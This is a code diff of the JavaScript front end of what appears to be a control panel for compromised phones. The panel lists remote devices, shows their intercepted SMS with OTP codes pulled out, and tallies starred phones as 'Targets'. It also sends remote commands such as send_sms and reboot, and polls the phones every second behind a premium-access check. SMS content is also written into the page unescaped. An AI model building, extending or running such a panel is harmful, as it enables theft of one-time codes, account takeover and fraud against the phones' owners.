-  const batt = d.battery_level || 0;
-  const bColor = battColor(batt);
-  const latest = (messages || [])[0] || latestSmsByDevice[d.id];
-  const latestText = latest ? formatMsgDate(latest) : 'No SMS';
+  const d = device || {}; const norm = normalizeStatus(d.status); const batt = d.battery_level || 0; const bColor = battColor(batt);
+  const latest = (messages || [])[0] || latestSmsByDevice[d.id]; const latestText = latest ? formatMsgDate(latest) : 'No SMS';
   const network = d.network && d.network !== 'Unknown' ? d.network : 'Unknown';
-  
-  const devicePhone = getDeviceTitle(d);
-  const devKey = d.id || devicePhone;
-  const favs = JSON.parse(localStorage.getItem('god_favs')||'[]');
-  const isFav = favs.includes(devKey);
-
-  return `<div class="device-summary">
-    <div class="device-summary-top">
-      <div>
-        <div class="device-summary-title">${devicePhone} <button class="copy-btn" onclick="copyText(\`${devicePhone}\`,event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button><button class="fav-btn ${isFav ? 'starred' : ''}" onclick="event.stopPropagation();toggleFav('${devKey}', this)"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg></button></div>
-        <div class="device-summary-id">${d.id || 'Unknown device id'}</div>
-      </div>
-      <span class="badge ${badgeClass(norm)}">${badgeLabel(norm, d.status || 'Unknown')}</span>
-    </div>
-    <div class="device-summary-grid">
-      <div class="device-summary-stat">
-        <div class="device-summary-label">Battery</div>
-        <div class="device-summary-value">
-          <span class="batt-row"><span class="batt-bar-bg"><span class="batt-bar" style="width:${batt}%;background:${bColor}"></span></span><span style="color:${bColor}">${batt}%</span></span>
-        </div>
-      </div>
-      <div class="device-summary-stat">
-        <div class="device-summary-label">Network</div>
-        <div class="device-summary-value">${network}</div>
-      </div>
-      <div class="device-summary-stat">
-        <div class="device-summary-label">Last SMS</div>
-        <div class="device-summary-value">${latestText}</div>
-      </div>
-      <div class="device-summary-stat">
-        <div class="device-summary-label">Status</div>
-        <div class="device-summary-value">${badgeLabel(norm, d.status || 'Unknown')}</div>
-      </div>
-    </div>
-  </div>`;
+  const devicePhone = getDeviceTitle(d); const devKey = d.id || devicePhone;
+  const isFav = JSON.parse(localStorage.getItem('god_favs')||'[]').includes(devKey);
+  return `<div class="device-summary"><div class="device-summary-top"><div><div class="device-summary-title">${devicePhone} <button class="copy-btn" onclick="window.copyText('${devicePhone}',event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button><button class="fav-btn ${isFav ? 'starred' : ''}" onclick="event.stopPropagation();window.toggleFav('${devKey}', this)"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg></button></div><div class="device-summary-id">${d.id || 'Unknown device id'}</div></div><span class="badge ${badgeClass(norm)}">${badgeLabel(norm, d.status || 'Unknown')}</span></div><div class="device-summary-grid"><div class="device-summary-stat"><div class="device-summary-label">Battery</div><div class="device-summary-value"><span class="batt-row"><span class="batt-bar-bg"><span class="batt-bar" style="width:${batt}%;background:${bColor}"></span></span><span style="color:${bColor}">${batt}%</span></span></div></div><div class="device-summary-stat"><div class="device-summary-label">Network</div><div class="device-summary-value">${network}</div></div><div class="device-summary-stat"><div class="device-summary-label">Last SMS</div><div class="device-summary-value">${latestText}</div></div><div class="device-summary-stat"><div class="device-summary-label">Status</div><div class="device-summary-value">${badgeLabel(norm, d.status || 'Unknown')}</div></div></div></div>`;
 }
 
-function loadMessageSeenTimes() {
-  try {
-    return JSON.parse(localStorage.getItem(MESSAGE_SEEN_STORAGE_KEY) || '{}');
-  } catch {
-    return {};
-  }
-}
-
-function saveMessageSeenTimes() {
-  try {
-    const entries = Object.entries(messageSeenTimes)
-      .sort((a, b) => Number(b[0]) - Number(a[0]))
-      .slice(0, 1200);
-    messageSeenTimes = Object.fromEntries(entries);
-    localStorage.setItem(MESSAGE_SEEN_STORAGE_KEY, JSON.stringify(messageSeenTimes));
-  } catch {}
-}
-
-function rememberMessageSeenTime(message, markNewAsNow) {
-  if (!message || message.id == null) return;
-  const key = String(message.id);
-  if (messageSeenTimes[key]) return;
-  messageSeenTimes[key] = markNewAsNow ? Date.now() : getMsgTime(message);
-}
-
-function getEffectiveMsgTime(message) {
-  if (!message) return 0;
-  const seen = message.id == null ? 0 : Number(messageSeenTimes[String(message.id)] || 0);
-  return seen || getMsgTime(message);
-}
-
-function getDeviceSmsTime(device) {
-  return latestSmsMap[device && device.id] || 0;
-}
-
+function loadMessageSeenTimes() { try { return JSON.parse(localStorage.getItem(MESSAGE_SEEN_STORAGE_KEY) || '{}'); } catch { return {}; } }
+function saveMessageSeenTimes() { try { const entries = Object.entries(messageSeenTimes).sort((a, b) => Number(b[0]) - Number(a[0])).slice(0, 1200); messageSeenTimes = Object.fromEntries(entries); localStorage.setItem(MESSAGE_SEEN_STORAGE_KEY, JSON.stringify(messageSeenTimes)); } catch {} }
+function rememberMessageSeenTime(message, markNewAsNow) { if (!message || message.id == null) return; const key = String(message.id); if (messageSeenTimes[key]) return; messageSeenTimes[key] = markNewAsNow ? Date.now() : getMsgTime(message); }
+function getEffectiveMsgTime(message) { if (!message) return 0; const seen = message.id == null ? 0 : Number(messageSeenTimes[String(message.id)] || 0); return seen || getMsgTime(message); }
 function sortDevicesByLatestSms(devices) {
   return (devices || []).sort((a, b) => {
-    const hasSmsA = !!latestSmsByDevice[a.id];
-    const hasSmsB = !!latestSmsByDevice[b.id];
+    const hasSmsA = !!latestSmsByDevice[a.id]; const hasSmsB = !!latestSmsByDevice[b.id];
     if (hasSmsA !== hasSmsB) return hasSmsB - hasSmsA;
-    const latestA = latestSmsTimeMap[a.id] || 0;
-    const latestB = latestSmsTimeMap[b.id] || 0;
-    const smsDiff = latestB - latestA;
+    const smsDiff = (latestSmsTimeMap[b.id] || 0) - (latestSmsTimeMap[a.id] || 0);
     if (smsDiff !== 0) return smsDiff;
     const activeDiff = (parseApiDate(b.last_active)?.getTime() || 0) - (parseApiDate(a.last_active)?.getTime() || 0);
     if (activeDiff !== 0) return activeDiff;
@@ -877,481 +826,181 @@ function sortDevicesByLatestSms(devices) {
   });
 }
 
-let latestLiveDevices = [];
+function getLiveDeviceInfo(deviceId) { return latestLiveDevices.find(d => d.id === deviceId) || allDevices.find(d => d.id === deviceId) || {}; }
+function timeAgo(ts) { try { const d = parseApiDate(ts); if (!d) return ''; const diff = Math.floor((Date.now() - d.getTime()) / 1000); if (diff < 0) return 'Just now'; if (diff < 60) return diff + 's ago'; if (diff < 3600) return Math.floor(diff/60) + 'm ago'; if (diff < 86400) return Math.floor(diff/3600) + 'h ago'; return Math.floor(diff/86400) + 'd ago'; } catch { return ''; } }
+function badgeClass(norm) { return { online:'badge-online', offline:'badge-offline', sent:'badge-sent', failed:'badge-failed', yes:'badge-yes' }[norm] || 'badge-other'; }
+function badgeLabel(norm, raw) { return { online:'Online', offline:'Offline', sent:'Sent ✓', failed:'Failed', yes:'Yes' }[norm] || raw; }
 
-function getLiveDeviceInfo(deviceId) {
-  return latestLiveDevices.find(d => d.id === deviceId) || allDevices.find(d => d.id === deviceId) || {};
-}
-
-
-function timeAgo(ts) {
-  try {
-    const d = parseApiDate(ts);
-    if (!d) return '';
-    const diff = Math.floor((Date.now() - d.getTime()) / 1000);
-    if (diff < 0) return 'Just now';
-    if (diff < 60) return diff + 's ago';
-    if (diff < 3600) return Math.floor(diff/60) + 'm ago';
-    if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
-    return Math.floor(diff/86400) + 'd ago';
-  } catch { return ''; }
-}
-
-function badgeClass(norm) {
-  return { online:'badge-online', offline:'badge-offline', sent:'badge-sent', failed:'badge-failed', yes:'badge-yes' }[norm] || 'badge-other';
-}
-function badgeLabel(norm, raw) {
-  return { online:'Online', offline:'Offline', sent:'Sent ✓', failed:'Failed', yes:'Yes' }[norm] || raw;
-}
-
-function setFilter(f, el) {
-  currentFilter = f;
-  visibleLimit = 120;
-  document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active'));
-  el.classList.add('active');
-  renderList();
-}
-
-function toggleSmsFilter(e){
-  e.stopPropagation();
-  const m=document.getElementById('smsFilterMenu');
-  m.style.display = m.style.display==='block' ? 'none' : 'block';
-}
-
-function chooseSmsFilter(val, el){
-  smsAgeFilter = val;
-  document.getElementById('smsFilterLabel').textContent = el.textContent;
-  document.getElementById('smsFilterMenu').style.display='none';
-  visibleLimit = 120;
-  renderList();
-}
+window.setFilter = function(f, el) { currentFilter = f; visibleLimit = 120; document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active')); el.classList.add('active'); renderList(); };
+window.toggleSmsFilter = function(e){ e.stopPropagation(); const m=document.getElementById('smsFilterMenu'); m.style.display = m.style.display==='block' ? 'none' : 'block'; };
+window.chooseSmsFilter = function(val, el){ smsAgeFilter = val; document.getElementById('smsFilterLabel').textContent = el.textContent; document.getElementById('smsFilterMenu').style.display='none'; visibleLimit = 120; renderList(); };
 
 function matchesSmsAgeFilter(device){
-  if(smsAgeFilter==='all') return true;
-  const recents = recentSmsByDevice[device && device.id] || [];
-  if(smsAgeFilter==='none') return recents.length===0;
-  const now = Date.now();
-  if(smsAgeFilter==='new'){
-    return recents.some(m => {
-      const rank = messageOrder[String(m.id)] || 0;
-      return rank > initialOrderSeq;
-    });
-  }
-  const top = recents[0];
-  if(!top) return false;
-  const age = now - getEffectiveMsgTime(top);
-  if(smsAgeFilter==='today'){
-    const d=new Date(); d.setHours(0,0,0,0);
-    return getEffectiveMsgTime(top) >= d.getTime();
-  }
-  if(smsAgeFilter==='1h') return age <= 60*60*1000;
-  if(smsAgeFilter==='24h') return age <= 24*60*60*1000;
-  if(smsAgeFilter==='7d') return age <= 7*24*60*60*1000;
-  if(smsAgeFilter==='old') return age > 7*24*60*60*1000;
+  if(smsAgeFilter==='all') return true; const recents = recentSmsByDevice[device && device.id] || [];
+  if(smsAgeFilter==='none') return recents.length===0; const now = Date.now();
+  if(smsAgeFilter==='new') return recents.some(m => (messageOrder[String(m.id)] || 0) > initialOrderSeq);
+  const top = recents[0]; if(!top) return false; const age = now - getEffectiveMsgTime(top);
+  if(smsAgeFilter==='today'){ const d=new Date(); d.setHours(0,0,0,0); return getEffectiveMsgTime(top) >= d.getTime(); }
+  if(smsAgeFilter==='1h') return age <= 3600000; if(smsAgeFilter==='24h') return age <= 86400000;
+  if(smsAgeFilter==='7d') return age <= 604800000; if(smsAgeFilter==='old') return age > 604800000;
   return true;
 }
 
-document.addEventListener('click', (e)=>{
-  const m=document.getElementById('smsFilterMenu');
-  const wrap=document.getElementById('smsFilter');
-  if(m && wrap && !wrap.contains(e.target)) m.style.display='none';
-});
-
-function handleSearch() {
-  visibleLimit = 120;
-  renderList();
-}
-
-function showMoreDevices() {
-  visibleLimit += 120;
-  renderList();
-}
-
-function setTab(i, el) {
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  el.classList.add('active');
-}
+document.addEventListener('click', (e)=>{ const m=document.getElementById('smsFilterMenu'); const wrap=document.getElementById('smsFilter'); if(m && wrap && !wrap.contains(e.target)) m.style.display='none'; });
+window.handleSearch = function() { visibleLimit = 120; renderList(); };
+window.showMoreDevices = function() { visibleLimit += 120; renderList(); };
 
 function renderList() {
   const q = document.getElementById('search').value.toLowerCase().trim();
   let devices = sortDevicesByLatestSms([...allDevices]);
-
-  if (currentFilter === 'starred') {
-    const favs = JSON.parse(localStorage.getItem('god_favs')||'[]');
-    devices = devices.filter(d => favs.includes(d.id) || favs.includes(getDeviceTitle(d)));
-  } else if (currentFilter !== 'all') {
-    devices = devices.filter(d => normalizeStatus(d.status) === currentFilter);
-  }
-  
-  if (smsAgeFilter !== 'all') {
-    devices = devices.filter(d => matchesSmsAgeFilter(d));
-  }
-  if (q) {
-    devices = devices.filter(d =>
-      (d.phone_number || '').toLowerCase().includes(q) ||
-      getDeviceTitle(d).toLowerCase().includes(q) ||
-      getDeviceSubInfo(d).toLowerCase().includes(q) ||
-      (d.id || '').toLowerCase().includes(q) ||
-      (d.network || '').toLowerCase().includes(q) ||
-      (d.status || '').toLowerCase().includes(q)
-    );
-  }
+  if (currentFilter === 'starred') { const favs = JSON.parse(localStorage.getItem('god_favs')||'[]'); devices = devices.filter(d => favs.includes(d.id) || favs.includes(getDeviceTitle(d))); } else if (currentFilter !== 'all') { devices = devices.filter(d => normalizeStatus(d.status) === currentFilter); }
+  if (smsAgeFilter !== 'all') devices = devices.filter(d => matchesSmsAgeFilter(d));
+  if (q) devices = devices.filter(d => (d.phone_number || '').toLowerCase().includes(q) || getDeviceTitle(d).toLowerCase().includes(q) || getDeviceSubInfo(d).toLowerCase().includes(q) || (d.id || '').toLowerCase().includes(q) || (d.network || '').toLowerCase().includes(q) || (d.status || '').toLowerCase().includes(q) );
 
   document.getElementById('list-count').textContent = devices.length + ' devices';
-
-  if (devices.length === 0) {
-    document.getElementById('device-list').innerHTML = '<div class="empty">No devices found</div>';
-    return;
-  }
+  if (devices.length === 0) return document.getElementById('device-list').innerHTML = '<div class="empty">No devices found</div>';
 
   const visibleDevices = devices.slice(0, visibleLimit);
   const html = '<div class="card">' + visibleDevices.map(d => {
-    const norm = normalizeStatus(d.status);
-    const batt = d.battery_level || 0;
-    const bColor = battColor(batt);
-    const phone = getDeviceTitle(d);
-    const recentForCard = (recentSmsByDevice[d.id] || []).slice(0, 5);
-    const recentHtml = recentForCard.length
-      ? `<div class="dev-recent-list">${recentForCard.map(s=>`<div class="dev-recent"><b>${s.address||s.sender||'Unknown'}</b> • ${formatMsgDate(s)}</div>`).join('')}</div>`
-      : '';
-    const net = !recentForCard.length ? getDeviceSubInfo(d) : '';
-    const latestSmsTime = latestSmsMap[d.id];
+    const norm = normalizeStatus(d.status); const batt = d.battery_level || 0; const bColor = battColor(batt);
+    const phone = getDeviceTitle(d); const recentForCard = (recentSmsByDevice[d.id] || []).slice(0, 5);
+    const recentHtml = recentForCard.length ? `<div class="dev-recent-list">${recentForCard.map(s=>`<div class="dev-recent"><b>${s.address||s.sender||'Unknown'}</b> • ${formatMsgDate(s)}</div>`).join('')}</div>` : '';
+    const net = !recentForCard.length ? getDeviceSubInfo(d) : ''; const latestSmsTime = latestSmsMap[d.id];
     const ago = latestSmsTime ? 'SMS ' + timeAgo(latestSmsTimeMap[d.id] || d.last_active) : timeAgo(d.last_active);
+    const devKey = d.id || phone; const isFav = JSON.parse(localStorage.getItem('god_favs')||'[]').includes(devKey);
     
-    const devKey = d.id || phone;
-    const favs = JSON.parse(localStorage.getItem('god_favs')||'[]');
-    const isFav = favs.includes(devKey);
-    
-    return `<div class="device-row" onclick="openSms(\'${d.id}\')" style="cursor:pointer">
+    return `<div class="device-row" onclick="window.openSms('${d.id}')" style="cursor:pointer">
       <div class="dev-left">
-        <div class="dev-phone">${phone} <button class="copy-btn" onclick="event.stopPropagation();copyText(\`${phone}\`,event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button><button class="fav-btn ${isFav ? 'starred' : ''}" onclick="event.stopPropagation();toggleFav('${devKey}', this)"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg></button></div>
-        <div class="dev-id" onclick="openSms(\'${d.id}\')" style="cursor:pointer;color:#2AABEE">${d.id}</div>
-        ${recentHtml}
-        ${net ? `<div class="dev-net">${net}</div>` : ''}
+        <div class="dev-phone">${phone} <button class="copy-btn" onclick="event.stopPropagation();window.copyText('${phone}',event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button><button class="fav-btn ${isFav ? 'starred' : ''}" onclick="event.stopPropagation();window.toggleFav('${devKey}', this)"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg></button></div>
+        <div class="dev-id" onclick="event.stopPropagation();window.openSms('${d.id}')" style="cursor:pointer;color:#2AABEE">${d.id}</div>
+        ${recentHtml} ${net ? `<div class="dev-net">${net}</div>` : ''}
       </div>
       <div class="dev-right">
         <span class="badge ${badgeClass(norm)}">${badgeLabel(norm, d.status)}</span>
-        <div class="batt-row">
-          <div class="batt-bar-bg"><div class="batt-bar" style="width:${batt}%;background:${bColor}"></div></div>
-          <span class="batt-txt" style="color:${bColor}">${batt}%</span>
-        </div>
+        <div class="batt-row"><div class="batt-bar-bg"><div class="batt-bar" style="width:${batt}%;background:${bColor}"></div></div><span class="batt-txt" style="color:${bColor}">${batt}%</span></div>
         <span class="last-active">${ago}</span>
       </div>
     </div>`;
-  }).join('') + '</div>' + (devices.length > visibleLimit
-    ? `<button class="load-more" onclick="showMoreDevices()">Show more (${devices.length - visibleLimit} left)</button>`
-    : '');
-
+  }).join('') + '</div>' + (devices.length > visibleLimit ? `<button class="load-more" onclick="window.showMoreDevices()">Show more (${devices.length - visibleLimit} left)</button>` : '');
   document.getElementById('device-list').innerHTML = html;
 }
 
 function updateSummary(devices) {
-  const total = devices.length;
-  const online = devices.filter(d => normalizeStatus(d.status) === 'online').length;
-  const sent = devices.filter(d => normalizeStatus(d.status) === 'sent').length;
-  const failed = devices.filter(d => normalizeStatus(d.status) === 'failed').length;
-
-  document.getElementById('s-total').textContent = total;
-  document.getElementById('s-online').textContent = online;
-  document.getElementById('s-sent').textContent = sent;
-  document.getElementById('s-failed').textContent = failed;
-  
-  try {
-    const favs = JSON.parse(localStorage.getItem('god_favs')||'[]');
-    const targetEl = document.getElementById('dashTargets');
-    if (targetEl) targetEl.textContent = favs.length + ' Targets';
-  } catch(e){}
+  const total = devices.length; const online = devices.filter(d => normalizeStatus(d.status) === 'online').length;
+  const sent = devices.filter(d => normalizeStatus(d.status) === 'sent').length; const failed = devices.filter(d => normalizeStatus(d.status) === 'failed').length;
+  document.getElementById('s-total').textContent = total; document.getElementById('s-online').textContent = online;
+  document.getElementById('s-sent').textContent = sent; document.getElementById('s-failed').textContent = failed;
+  try { const favs = JSON.parse(localStorage.getItem('god_favs')||'[]'); const targetEl = document.getElementById('dashTargets'); if (targetEl) targetEl.textContent = favs.length + ' Targets'; } catch(e){}
 }
 
-async function loadData(showLoader = true, showToastSuccess = false) {
-  console.info('loadData called', { showLoader, showToastSuccess, isRefreshing });
-  if (isRefreshing) {
-    if (showLoader) document.getElementById('conn-status').innerHTML = '<span class="dot dot-on"></span>Already refreshing...';
-    if (showToastSuccess) showToast('Already refreshing...', 'info');
-    return;
-  }
+window.loadData = async function(showLoader = true, showToastSuccess = false) {
+  if (!window.checkPremium()) return;
+  if (isRefreshing) return;
   isRefreshing = true;
-  const btn = null;
-  if (btn) btn.disabled = true;
-  if (showLoader) {
-    document.getElementById('device-list').innerHTML = '<div class="loader"><div class="spinner"></div>Loading devices...</div>';
-    document.getElementById('conn-status').innerHTML = '<span class="dot dot-on"></span>Connecting...';
-  }
+  if (showLoader) { document.getElementById('device-list').innerHTML = '<div class="loader"><div class="spinner"></div>Loading devices...</div>'; document.getElementById('conn-status').innerHTML = '<span class="dot dot-on"></span>Connecting...'; }
   try {
     const res = await fetch(API_URL + '&_t=' + Date.now(), {cache:'no-store'});
     if (!res.ok) throw new Error('HTTP ' + res.status);
-    const data = await res.json();
-    allDevices = data.devices || [];
-    buildLatestSmsMap(data.messages||[]);
-    if(!hasLoadedOnce){
-      initialOrderSeq = messageOrderSeq;
-      hasLoadedOnce = true;
-    }
-    sortDevicesByLatestSms(allDevices);
-    updateSummary(allDevices);
-    renderList();
+    const data = await res.json(); allDevices = data.devices || [];
+    const mergedMsgs = [...localFakeSms, ...(data.messages || [])]; buildLatestSmsMap(mergedMsgs);
+    if(!hasLoadedOnce){ initialOrderSeq = messageOrderSeq; hasLoadedOnce = true; }
+    sortDevicesByLatestSms(allDevices); updateSummary(allDevices); renderList();
     const now = new Date().toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
     document.getElementById('conn-status').innerHTML = '<span class="dot dot-on"></span>Updated ' + now;
     if (showToastSuccess) showToast('Refreshed successfully', 'ok');
   } catch(e) {
-    console.error('loadData failed', e);
     if (showLoader) document.getElementById('device-list').innerHTML = '<div class="empty">Failed to load: ' + e.message + '</div>';
     document.getElementById('conn-status').innerHTML = '<span class="dot dot-off"></span>Connection error';
-  } finally {
-    isRefreshing = false;
-    if (btn) btn.disabled = false;
-  }
-}
+  } finally { isRefreshing = false; }
+};
 
-window.loadData = loadData;
+if(window.checkPremium()){ window.loadData(); }
+setInterval(() => { if(window.checkPremium()) window.loadData(false); }, 1000);
 
-const refreshButton = document.getElementById('refreshBtn');
+/* --- MODALS & QUICK ACTIONS --- */
+window.sendDeviceCommand = function(cmd, btnElem) {
+    if (!currentSmsDevice) return showToast('No device selected', 'info');
+    btnElem.style.opacity = '0.5'; btnElem.style.pointerEvents = 'none';
+    const payload = { action: cmd, command: cmd, device_id: currentSmsDevice };
+    fetch(COMMAND_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(e => console.error("Command Error:", e));
+    setTimeout(() => {
+        let actionName = 'Command Sent'; if(cmd === 'refresh_network') actionName = 'Network Refresh Sent'; if(cmd === 'clear_cache') actionName = 'Cache Clear Sent'; if(cmd === 'ping') actionName = 'Ping Sent'; if(cmd === 'reboot') actionName = 'Reboot Command Sent';
+        showToast(actionName, 'ok'); btnElem.style.opacity = '1'; btnElem.style.pointerEvents = 'auto';
+    }, 500);
+};
 
-loadData();
-setInterval(() => loadData(false), 1000);
-</script>
+window.sendCustomSms = function() {
+    if (!currentSmsDevice) return showToast('No device selected', 'info');
+    const phone = document.getElementById('customSmsPhone').value.trim(); const message = document.getElementById('customSmsMessage').value.trim();
+    if (!phone || !message) return showToast('Please enter number and message', 'info');
+    const btn = document.querySelector('.act-send'); const originalText = btn.textContent; btn.textContent = 'Sending...'; btn.disabled = true;
+    const payload = { action: 'send_sms', command: 'send_sms', device_id: currentSmsDevice, phone: phone, target_phone: phone, message: message, sms_body: message };
+    fetch(COMMAND_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(e => console.error("SMS API Error:", e));
+    setTimeout(() => {
+        const fakeSms = { id: 'sent_' + Date.now(), device_id: currentSmsDevice, source_id: currentSmsDevice, sender: phone, address: phone, body: message, message: message, date: new Date().toISOString(), received_at: new Date().toISOString() };
+        localFakeSms.push(fakeSms); if (!recentSmsByDevice[currentSmsDevice]) recentSmsByDevice[currentSmsDevice] = []; recentSmsByDevice[currentSmsDevice].unshift(fakeSms);
+        const device = allDevices.find(x => x.id === currentSmsDevice) || { id: currentSmsDevice }; renderSmsForDevice(device, recentSmsByDevice[currentSmsDevice].slice(0, 20));
+        showToast('SMS Command Sent!', 'ok'); document.getElementById('customSmsMessage').value = ''; btn.textContent = originalText; btn.disabled = false; window.switchModalTab('logs');
+    }, 300);
+};
 
-<div id="smsModal" class="modal">
-  <div class="modal-panel">
-    <div class="modal-top"><button class="back-btn" onclick="closeSms()">Back</button><h3 class="modal-title">SMS Messages</h3><button class="sheet-refresh-btn" id="smsRefreshBtn" onclick="manualRefreshSms()">Refresh</button></div>
-    <div id="smsList">Syncing SMS...</div>
-  </div>
-</div>
-<div id="toast" class="toast"></div>
+window.switchModalTab = function(tab) {
+  if(tab === 'logs') { document.getElementById('tabLogs').classList.add('active'); document.getElementById('tabAction').classList.remove('active'); document.getElementById('logsView').style.display = 'block'; document.getElementById('actionView').style.display = 'none'; document.getElementById('smsRefreshBtn').style.display = 'block'; } else { document.getElementById('tabLogs').classList.remove('active'); document.getElementById('tabAction').classList.add('active'); document.getElementById('logsView').style.display = 'none'; document.getElementById('actionView').style.display = 'block'; document.getElementById('smsRefreshBtn').style.display = 'none'; }
+};
 
-<script>
+function formatTimeValue(msOrDate){ const d = msOrDate instanceof Date ? msOrDate : new Date(msOrDate); if(!d) return ''; const pad=n=>String(n).padStart(2,'0'); let hour=d.getHours(); const ampm=hour>=12?'PM':'AM'; hour=hour%12 || 12; return `${pad(d.getDate())}/${pad(d.getMonth()+1)}/${String(d.getFullYear()).slice(-2)} ${pad(hour)}:${pad(d.getMinutes())}:${pad(d.getSeconds())} ${ampm} IST`; }
+function formatMsgDate(message){ return formatTimeValue(getMsgTime(message)); }
 
-function formatTimeValue(msOrDate){
- const d = msOrDate instanceof Date ? msOrDate : new Date(msOrDate);
- if(!d) return '';
- const pad=n=>String(n).padStart(2,'0');
- let hour=d.getHours();
- const ampm=hour>=12?'PM':'AM';
- hour=hour%12 || 12;
- return `${pad(d.getDate())}/${pad(d.getMonth()+1)}/${String(d.getFullYear()).slice(-2)} ${pad(hour)}:${pad(d.getMinutes())}:${pad(d.getSeconds())} ${ampm} IST`;
-}
-
-function formatDate(dateStr){
- const d=parseApiDate(dateStr);
- return d ? formatTimeValue(d) : '';
-}
-
-function formatMsgDate(message){
- return formatTimeValue(getMsgTime(message));
-}
-
-function closeSms(){
- document.getElementById('smsModal').style.display='none';
- currentSmsDevice=null;
-
- if(openedFromLiveFeed){
-   openedFromLiveFeed=false;
-   openLiveSms();
- }
-}
-
-let openedFromLiveFeed=false;
-
-let currentSmsDevice=null;
-let isSmsRefreshing=false;
-let currentSmsIds=[];
-let toastTimer=null;
-
-function showToast(message, type='info'){
- const toast=document.getElementById('toast');
- if(!toast) return;
- toast.textContent=message;
- toast.className='toast show ' + type;
- clearTimeout(toastTimer);
- toastTimer=setTimeout(()=>{ toast.className='toast ' + type; }, 1800);
-}
-
-function getSmsIds(sms){
- return (sms||[]).map(s=>String(s.id ?? `${s.sender||s.address||''}-${s.received_at||s.date||''}-${s.body||s.message||''}`));
-}
-
-function hasNewSms(previousIds, nextIds){
- if(!previousIds || previousIds.length===0) return false;
- const seen=new Set(previousIds);
- return nextIds.some(id=>!seen.has(id));
-}
+window.closeSms = function(){ document.getElementById('smsModal').style.display='none'; currentSmsDevice=null; if(openedFromLiveFeed){ openedFromLiveFeed=false; window.openLiveSms(); } };
+function showToast(message, type='info'){ const toast=document.getElementById('toast'); if(!toast) return; toast.textContent=message; toast.className='toast show ' + type; clearTimeout(toastTimer); toastTimer=setTimeout(()=>{ toast.className='toast ' + type; }, 1800); }
+window.showToast = showToast;
+function getSmsIds(sms){ return (sms||[]).map(s=>String(s.id ?? `${s.sender||s.address||''}-${s.received_at||s.date||''}-${s.body||s.message||''}`)); }
+function hasNewSms(previousIds, nextIds){ if(!previousIds || previousIds.length===0) return false; const seen=new Set(previousIds); return nextIds.some(id=>!seen.has(id)); }
 
 function renderSmsForDevice(device, sms){
  currentSmsIds=getSmsIds(sms);
- if(!sms.length){
-    document.getElementById('smsList').innerHTML=renderDeviceSummary(device, sms) + '<div class="empty">No SMS found for this device</div>';
-    return;
- }
- document.getElementById('smsList').innerHTML=renderDeviceSummary(device, sms) + sms.map(s=>`
-    <div class="sms-card">
-     <div class="sms-card-header"><b>${s.address||s.sender||'Unknown'}</b><span class="sms-card-time">${formatMsgDate(s)}</span></div>
-     <div class="sms-card-body">${s.body||s.message||''}</div>
-     ${s.otp_code ? `<div class="otp-chip">OTP: ${s.otp_code}</div>` : ''}
-    </div>
- `).join('');
+ if(!sms.length){ document.getElementById('smsList').innerHTML=renderDeviceSummary(device, sms) + '<div class="empty">No SMS found for this device</div>'; return; }
+ document.getElementById('smsList').innerHTML=renderDeviceSummary(device, sms) + sms.map(s=>`<div class="sms-card"><div class="sms-card-header"><b>${s.address||s.sender||'Unknown'}</b><span class="sms-card-time">${formatMsgDate(s)}</span></div><div class="sms-card-body">${s.body||s.message||''}</div>${s.otp_code ? `<div class="otp-chip">OTP: ${s.otp_code}</div>` : ''}</div>`).join('');
 }
 
 async function refreshOpenSms(showLoading=false, manual=false){
  if(!currentSmsDevice || document.getElementById('smsModal').style.display==='none' || isSmsRefreshing) return;
- const deviceId=currentSmsDevice;
- const prevIds=[...currentSmsIds];
- isSmsRefreshing=true;
- const btn=document.getElementById('smsRefreshBtn');
- if(manual && btn) btn.disabled=true;
+ const deviceId=currentSmsDevice; const prevIds=[...currentSmsIds]; isSmsRefreshing=true; const btn=document.getElementById('smsRefreshBtn'); if(manual && btn) btn.disabled=true;
  if(showLoading) document.getElementById('smsList').innerHTML='Loading SMS...';
  try{
-  const res=await fetch(API_URL + '&_t=' + Date.now(), {cache:'no-store'});
-  const data=await res.json();
-  buildLatestSmsMap(data.messages||[]);
+  const res=await fetch(API_URL + '&_t=' + Date.now(), {cache:'no-store'}); const data=await res.json(); const mergedMsgs = [...localFakeSms, ...(data.messages || [])]; buildLatestSmsMap(mergedMsgs);
   const device=(data.devices||[]).find(x=>x.id===deviceId) || allDevices.find(x=>x.id===deviceId) || {id:deviceId};
-  const sms=(data.messages||[])
- .filter(m=>m.device_id===deviceId || m.source_id===deviceId)
- .sort((a,b)=> getMsgTime(b)-getMsgTime(a))
